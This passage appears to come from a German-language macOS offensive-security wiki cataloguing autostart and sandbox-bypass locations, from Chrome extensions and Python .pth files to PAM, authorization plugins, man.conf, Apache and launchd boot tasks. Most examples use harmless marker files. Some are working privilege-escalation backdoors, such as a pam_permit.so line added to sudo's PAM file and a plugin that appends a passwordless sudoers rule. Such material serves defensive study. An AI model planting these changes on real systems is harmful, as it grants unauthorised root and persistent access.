Dies sind zwei unterschiedliche Installationswege. In der [Dokumentation zur externen Installation](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) von Chrome heißt es, dass **Benutzer unter Windows und macOS eine angebotene Erweiterung bestätigen und aktivieren müssen**, wenn sie über eine *External Extensions*-Datei bereitgestellt wird; sie wird nicht allein dadurch ausgeführt, dass diese JSON-Datei geschrieben wird. Für eine Installation für alle Benutzer unter macOS muss Chrome außerdem vor Änderungen durch Benutzer ohne erhöhte Rechte geschützt werden. Eine verwaltete Richtlinie `ExtensionInstallForcelist` oder `ExtensionSettings` kann eine Erweiterung ohne Interaktion des Benutzers installieren und anheften; [Googles Mac-Richtlinienleitfaden](https://support.google.com/chrome/a/answer/7517624) beschreibt die verwaltete Konfiguration und erklärt, dass der Benutzer zwangsinstallierte Erweiterungen nicht entfernen kann. Das ist ein Richtlinienbereitstellungsweg und keine Abkürzung per benutzerspezifischem `defaults write`.<sup>[[49]](#references)</sup>

> [!WARNING]
> Unter macOS muss das JSON-Manifest *External Extensions* auf eine Update-URL des **Chrome Web Store** verweisen, nicht auf ein lokales CRX. Die Bereitstellung über verwaltete Richtlinien hat eigene Unternehmensvoraussetzungen und kann eine verwaltete, selbst gehostete Update-URL erlauben. Für eine lokale, entpackte Erweiterung in einem Testprofil ist Chromes Entwicklermodus-Schalter `--load-extension=/path` ein separater Mechanismus und bewirkt nicht, dass eine JSON-Datei für External Extensions selbstständig ausgeführt wird. Ein Schreiben in `Secure Preferences` ist nicht mit einem der beiden dokumentierten Registrierungswege gleichzusetzen.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Starte Chrome in diesem Wegwerfkonto und beobachte die Aktivierungsaufforderung; das eigene Verhalten der Erweiterung ist der Ausführungs-PoC, sobald der Benutzer zustimmt. Entferne nach dem Test das Manifest und deaktiviere/deinstalliere die Erweiterung in diesem Profil. Dieser Weg wurde im aktiven Chrome-Profil auf dem Research-Mac **nicht** getestet. Die Managed-Policy-Route wurde dort ebenfalls nicht eingerichtet.

Force-install und External Extensions verwenden **Chrome Web Store**-Erweiterungs-IDs; für den Low-Level-Trick, eine lokale Erweiterung durch Bearbeiten der HMAC-signierten `Secure Preferences` des Profils still einzuschleusen, sowie für anderen Missbrauch von Chromium-Prozessen siehe:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### URL-Schema- und Dateityp-Handler (LaunchServices)

Writeup: [Remote Mac Exploitation Via Custom URL Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ausgelöst wird dies, wenn das Opfer auf einen Link klickt (z. B. in Chrome/Brave/Safari) oder eine Datei des registrierten Typs öffnet
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- Eine App-Bundle-`Info.plist`, die **`CFBundleURLTypes`/`CFBundleURLSchemes`** (benutzerdefiniertes URL-Schema) oder **`CFBundleDocumentTypes`** (Dateierweiterung/UTI) deklariert
- Effektive benutzerspezifische Standardeinstellungen können in **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (Array `LSHandlers`) erscheinen. Apples unterstützte API zur Auswahl eines Standardhandlers für ein URL-Schema ist `LSSetDefaultHandlerForURLScheme`; das direkte Schreiben in diese plist ist weder eine dokumentierte Registrierungsmethode noch eine Methode zum Aktualisieren des Caches.

#### Beschreibung & Ausnutzung

Launch Services bezieht URL-Schema- und Dokumentzuordnungen aus der `Info.plist` einer registrierten App. [Apple's registration guide](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) besagt, dass die Registrierung erfolgen kann, wenn Finder die App entdeckt, beim Starten oder Anmelden oder über eine explizite Registrierungs-API; das bloße Ablegen einer App an einem beliebigen Ort löst nicht garantiert sofort eine Registrierung aus. Nach der Registrierung kann das Öffnen einer passenden URL oder eines passenden Dokuments die ausgewählte Handler-App starten, abhängig von der Standardhandler-Auswahl des Benutzers und den normalen macOS-Startprüfungen. Die unterstützte API `LSSetDefaultHandlerForURLScheme` ändert den vom Benutzer bevorzugten URL-Handler; sie bewirkt nicht, dass eine neu abgelegte App automatisch ausgeführt wird.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Auf dem macOS 26.5.2 Research-Mac wurde keine App registriert und keine Handler-Präferenz geändert. Um einen tatsächlichen Handler zu testen, verwende ein entbehrliches Benutzerkonto, registriere eine Marker-only-App mit einem eindeutigen Scheme, rufe ihre URL auf und entferne anschließend die App und ihre Registrierung.

Eine ausführliche Anleitung zum Auflisten und Abusing von File-Extension- und URL-Scheme-Handlern findest du unter:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Python-Startup-Dateien (`.pth` / `usercustomize` / `sitecustomize`)

Writeup: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Wird ausgeführt, wenn der entsprechende Python-Interpreter mit aktiviertem site-Verzeichnis startet; der Trigger gilt nicht universell für virtuelle Umgebungen, Python-Builds oder Startup-Flags
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Wird mit den Berechtigungen/TCC des Prozesses ausgeführt, der den Interpreter gestartet hat

#### Speicherort

- **`$(python3 -m site --user-site)/*.pth`** (macOS-Framework-Builds: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Kein Root erforderlich (vom Benutzer beschreibbar)
  - **Auslöser**: Start dieses Python-Builds mit aktiviertem User-Site; das `site`-Modul verarbeitet `.pth`-Dateien in aktiven Site-Verzeichnissen
- **`<user-site>/usercustomize.py`**
  - Kein Root erforderlich
  - **Auslöser**: Start mit aktiviertem User-Site (wird automatisch von `site` importiert)
- **`<prefix>/site-packages/sitecustomize.py`** (z. B. `/opt/homebrew/lib/python3.13/site-packages/` oder Systempfade)
  - Je nach Speicherort des Interpreters sind möglicherweise Root-/Admin-Rechte erforderlich
  - **Auslöser**: Start eines Interpreters, der dieses Site-Verzeichnis einbindet

#### Beschreibung und Ausnutzung

Beim Start importiert Python normalerweise `site` und durchsucht seine aktiven `site-packages`-Verzeichnisse nach `.pth`-Dateien. Neben dem Hinzufügen von Pfaden führt eine `.pth`-Zeile, die mit `import ` beginnt, Python-Code aus, selbst wenn das angegebene Modul sonst nie verwendet wird. Python versucht außerdem, `sitecustomize` und, **wenn das User-Site aktiviert ist**, `usercustomize` zu importieren.<sup>[[56]](#references)</sup> Der Trigger ist ein späterer Start eines Interpreters, der das geänderte Verzeichnis einliest. `-S` deaktiviert die Verarbeitung durch `site`; `-s`, `-I` oder `PYTHONNOUSERSITE` deaktivieren die Varianten des **User-Site**. `-I` deaktiviert im Allgemeinen kein globales `sitecustomize`. Virtuelle Umgebungen können das User-Site ebenfalls ausschließen. Prüfe `python3 -m site` für den jeweiligen Interpreter.

Der folgende PoC wurde auf macOS 26.5.2 ausgeführt. `PYTHONUSERBASE` verschiebt das User-Site für diesen Test in ein temporäres Verzeichnis; das tatsächliche User-Site wird nicht verändert:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Beide Marker wurden angezeigt. Bei einer Wiederholung mit `-s`, `-I` oder `-S` wurden in diesem Test beide **user-site**-Marker verhindert. `sitecustomize` in einem globalen Site-Verzeichnis wurde nicht getestet.

## Root Sandbox Bypass

> [!TIP]
> Hier findest du Startorte, die für einen **sandbox bypass** nützlich sind und es ermöglichen, etwas einfach auszuführen, indem man es **in eine Datei schreibt**, wobei man **root** sein muss und/oder andere **ungewöhnliche Bedingungen** erfüllt sein müssen.

### Periodic

> [!CAUTION]
> **Historischer Mechanismus:** Auf dem Testgerät mit macOS 26.5.2 fehlen `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` und die `com.apple.periodic-*`-Launch-Daemons. Gehe nicht davon aus, dass das Erstellen von `/etc/periodic` auf einem aktuellen System dessen Inhalte ausführt. Prüfe vor Verwendung des folgenden Beispiels, ob sowohl der Befehl als auch ein aktivierter Scheduler in der jeweiligen Zielversion vorhanden sind.

Write-up: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Nützlich für einen sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Dafür musst du jedoch root sein
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Root-Rechte erforderlich
  - **Auslöser**: Wenn der Zeitpunkt gekommen ist
- `/etc/daily.local`, `/etc/weekly.local` oder `/etc/monthly.local`
  - Root-Rechte erforderlich
  - **Auslöser**: Wenn der Zeitpunkt gekommen ist

#### Beschreibung & Ausnutzung

In älteren Versionen wurden die periodischen Skripte (**`/etc/periodic`**) von **Launch-Daemons** unter `/System/Library/LaunchDaemons/com.apple.periodic*` geplant. Ab macOS Big Sur 11.5 führte der Periodic-Runner Skripte in den Periodic-Verzeichnissen als **Eigentümer der jeweiligen Datei** aus und schloss damit einen früheren Pfad zur Rechteausweitung.<sup>[[27]](#references)</sup> Die folgenden Befehle und Verzeichnisauflistungen stammen aus historischen Ausgaben und wurden nicht auf macOS 26.5.2 getestet.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Es gibt weitere regelmäßig ausgeführte Skripte, die in **`/etc/defaults/periodic.conf`** angegeben sind:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

Auf älteren Systemen, auf denen `periodic` und die zugehörigen Launch-Daemons installiert und aktiviert sind, waren `/etc/daily.local`, `/etc/weekly.local` und `/etc/monthly.local` zusätzliche Ausführungspfade. Eine harmlose schreibgeschützte Prüfung ist:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Die eigentümerbasierte Regel galt für Skripte, die direkt in den periodischen Verzeichnissen lagen. Der historische Wrapper `999.local` band früher `/etc/daily.local`, `/etc/weekly.local` oder `/etc/monthly.local` ein, ohne dieselbe Eigentümerprüfung durchzuführen. Wenn der Scheduler als root lief, wurden diese lokalen Dateien ebenfalls als root ausgeführt. Dieser Unterschied und die Änderung in Big Sur 11.5 sind in der [ursprünglichen Recherche](https://theevilbit.github.io/beyond/beyond_0019/) dokumentiert. Es sollte nicht davon ausgegangen werden, dass einer dieser Pfade aktiv ist, wenn `periodic` nicht vorhanden ist.

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Dafür musst du jedoch root sein
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

- Root ist immer erforderlich

#### Beschreibung & Ausnutzung

Da PAM sich stärker auf **Persistence** und Malware als auf die einfache Ausführung innerhalb von macOS konzentriert, enthält dieser Blog keine ausführliche Erklärung. **Lies die Writeups, um diese Technik besser zu verstehen.**<sup>[[28]](#references)</sup>

Überprüfe PAM-Module mit:

```bash
ls -l /etc/pam.d
```

Eine Persistence-/Privilege-Escalation-Technik, die PAM missbraucht, lässt sich einfach umsetzen, indem man das Modul /etc/pam.d/sudo ändert und am Anfang die folgende Zeile hinzufügt:

```bash
auth       sufficient     pam_permit.so
```

Es wird also **etwa so aussehen**:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

Und daher wird jeder Versuch, **`sudo` zu verwenden, funktionieren**.

> [!CAUTION]
> Beachte, dass dieses Verzeichnis durch TCC geschützt ist. Daher wird der Benutzer höchstwahrscheinlich aufgefordert, den Zugriff zu erlauben.

Ein weiteres gutes Beispiel ist `su`. Daran sieht man, dass es auch möglich ist, den PAM-Modulen Parameter zu übergeben (und dass man diese Datei auch backdooren könnte):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
  - Dafür musst du jedoch root sein und zusätzliche Konfigurationen vornehmen
- TCC bypass: ???

#### Speicherort

- `/Library/Security/SecurityAgentPlugins/`
  - Root erforderlich
  - Außerdem muss die authorization database so konfiguriert werden, dass sie das Plugin verwendet

#### Beschreibung & Ausnutzung

Du kannst ein authorization plugin erstellen, das ausgeführt wird, wenn sich ein Benutzer anmeldet, um Persistenz aufrechtzuerhalten. Weitere Informationen dazu, wie du eines dieser Plugins erstellst, findest du in den vorherigen writeups (und sei vorsichtig: Ein schlecht geschriebenes Plugin kann dich aussperren, sodass du deinen Mac im Recovery-Modus bereinigen musst).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Verschiebe** das Bundle an den Speicherort, von dem es geladen werden soll:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Fügen Sie schließlich die **Regel** hinzu, um dieses Plugin zu laden:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** teilt dem Autorisierungs-Framework mit, dass es **für die Autorisierung einen externen Mechanismus aufrufen muss**. Außerdem sorgt **`privileged`** dafür, dass dieser als root ausgeführt wird.

Löse es aus mit:

```bash
security authorize com.asdf.asdf
```

Und dann sollte die **staff-Gruppe sudo**-Zugriff haben (lies `/etc/sudoers`, um dies zu bestätigen).

### Man.conf

Write-up: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Dafür musst du jedoch root sein und der Benutzer muss man verwenden
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`/private/etc/man.conf`**
  - Root erforderlich
  - **`/private/etc/man.conf`**: Wird immer verwendet, wenn man gestartet wird

#### Beschreibung & Exploit

Die Konfigurationsdatei **`/private/etc/man.conf`** gibt die Binärdatei bzw. das Skript an, das beim Öffnen von man-Dokumentationsdateien verwendet wird. Daher könnte der Pfad zur ausführbaren Datei geändert werden, sodass jedes Mal, wenn der Benutzer man zum Lesen von Dokumentation verwendet, eine Backdoor ausgeführt wird.<sup>[[31]](#references)</sup>

Zum Beispiel kannst du Folgendes in **`/private/etc/man.conf`** festlegen:

```
MANPAGER /tmp/view
```

Und erstelle dann `/tmp/view` als:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
  - Dafür musst du jedoch root sein und Apache muss laufen
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd hat keine Entitlements

#### Speicherort

- **`/etc/apache2/httpd.conf`**
  - Root erforderlich
  - Auslöser: Wenn Apache2 gestartet wird

#### Beschreibung & Exploit

Du kannst in `/etc/apache2/httpd.conf` angeben, dass ein Modul geladen werden soll, indem du eine Zeile wie diese hinzufügst:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

Auf diese Weise wird dein kompiliertes Modul von Apache geladen. Du musst es lediglich entweder **mit einem gültigen Apple-Zertifikat signieren** oder **dem System ein neues vertrauenswürdiges Zertifikat hinzufügen** und es damit **signieren**.

Falls nötig, kannst du anschließend Folgendes ausführen, um sicherzustellen, dass der Server gestartet wird:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Codebeispiel für den Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM-Audit-Framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
  - Dafür musst du jedoch root sein, auditd muss laufen und eine Warnung auslösen
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`/etc/security/audit_warn`**
  - Root-Rechte erforderlich
  - **Auslöser**: Wenn auditd eine Warnung erkennt

#### Beschreibung & Exploit

Immer wenn auditd eine Warnung erkennt, wird das Skript **`/etc/security/audit_warn`** **ausgeführt**. Du könntest also deine Payload hinzufügen.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Du könntest mit `sudo audit -n` eine Warnung erzwingen.

### Startelemente

> [!CAUTION] > **Dies ist veraltet, daher sollte in diesen Verzeichnissen nichts gefunden werden.**

Das **StartupItem** ist ein Verzeichnis, das sich entweder unter `/Library/StartupItems/` oder `/System/Library/StartupItems/` befinden sollte. Sobald dieses Verzeichnis angelegt wurde, muss es zwei bestimmte Dateien enthalten:

1. Ein **rc-Skript**: Ein Shell-Skript, das beim Start ausgeführt wird.
2. Eine **plist-Datei** mit dem Namen `StartupParameters.plist`, die verschiedene Konfigurationseinstellungen enthält.

Stelle sicher, dass sowohl das rc-Skript als auch die Datei `StartupParameters.plist` korrekt im Verzeichnis **StartupItem** abgelegt sind, damit der Startvorgang sie erkennt und verwendet.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Ich kann diese Komponente auf meinem macOS-System nicht finden. Weitere Informationen finden Sie daher im Writeup.

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

**emond** wurde von Apple eingeführt und ist ein Protokollierungsmechanismus, der unterentwickelt oder möglicherweise aufgegeben zu sein scheint, aber weiterhin zugänglich ist. Dieser obskure Dienst ist für Mac-Administratoren zwar nicht besonders nützlich, könnte jedoch als unauffällige Persistenzmethode für Threat Actors dienen, die den meisten macOS-Administratoren wahrscheinlich entgehen würde.<sup>[[34]](#references)</sup>

Wer von seiner Existenz weiß, kann jede bösartige Nutzung von **emond** leicht erkennen. Der LaunchDaemon des Systems für diesen Dienst sucht in einem einzigen Verzeichnis nach auszuführenden Scripts. Zur Überprüfung kann folgender Befehl verwendet werden:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Speicherort

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Root erforderlich
  - **Auslöser**: Mit XQuartz

#### Beschreibung & Exploit

XQuartz wird **nicht mehr in macOS installiert**. Weitere Informationen findest du daher im Writeup.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Die Installation eines kext ist selbst als Root so kompliziert, dass sie ohne Exploit nicht als praktische Sandbox-Umgehungs- oder Persistenztechnik gilt.

#### Speicherort

Um ein KEXT als Startelement zu installieren, muss es **an einem der folgenden Speicherorte installiert sein**:

- `/System/Library/Extensions`
  - KEXT-Dateien, die in das Betriebssystem OS X integriert sind.
- `/Library/Extensions`
  - KEXT-Dateien, die von Software von Drittanbietern installiert werden

Du kannst die aktuell geladenen kext-Dateien mit folgendem Befehl auflisten:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

For more information zu [**Kernel Extensions siehe diesen Abschnitt**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Speicherort

- **`/usr/local/bin/amstoold`**
  - Root erforderlich

#### Beschreibung & Exploitation

Offenbar verwendete die `plist` aus `/System/Library/LaunchAgents/com.apple.amstoold.plist` diese Binärdatei und stellte dabei einen XPC-Dienst bereit ... Das Problem war, dass die Binärdatei nicht existierte. Man konnte also etwas dort ablegen, und wenn der XPC-Dienst aufgerufen wird, wird die eigene Binärdatei ausgeführt.<sup>[[35]](#references)</sup>

Ich kann sie in meinem macOS nicht mehr finden.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Speicherort

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Root erforderlich
  - **Auslöser**: Wenn der Dienst ausgeführt wird (selten)

#### Beschreibung & Exploit

Offenbar wird dieses Skript nicht oft ausgeführt, und ich konnte es nicht einmal auf meinem macOS finden. Weitere Informationen findest du daher im Writeup.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Dies funktioniert in modernen macOS-Versionen nicht**

Es ist auch möglich, hier **Befehle abzulegen, die beim Start ausgeführt werden.** Beispiel für ein reguläres rc.common-Skript:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchd-Boot-Aufgaben

Write-up: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [🔴](https://emojipedia.org/large-red-circle) (Root erforderlich)
- Root erforderlich, außerdem je nach Pfad entweder ein **SIP bypass** oder die Berechtigung **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access

#### Speicherort

`launchd` enthält in seinem Abschnitt **`__TEXT,__config`** eine plist, die frühe „Boot-Aufgaben“ beschreibt. Einige Referenzskripte/-binärdateien existieren standardmäßig **nicht** und können von einem Angreifer erstellt werden:

- SIP-bypass-Gruppe: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- TCC/FDA-Gruppe: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` existiert nur auf Sequoia+ bereits)

#### Beschreibung & Ausnutzung

Gib die eingebettete Aufgabentabelle aus, um zu sehen, welche Dateien `launchd` ausführt und welche Schlüssel unterstützt werden (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Das Erstellen einer der referenzierten Dateien (z. B. `/etc/rc.server`) veranlasst `launchd`, sie beim nächsten (Userspace-)Neustart auszuführen. Die nützlichsten Einträge sind durch SIP eingeschränkt oder erfordern TCC SysAdminFiles/Full Disk Access. Daher handelt es sich um eine auf Root-Rechte angewiesene, durch einen Neustart ausgelöste Technik.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

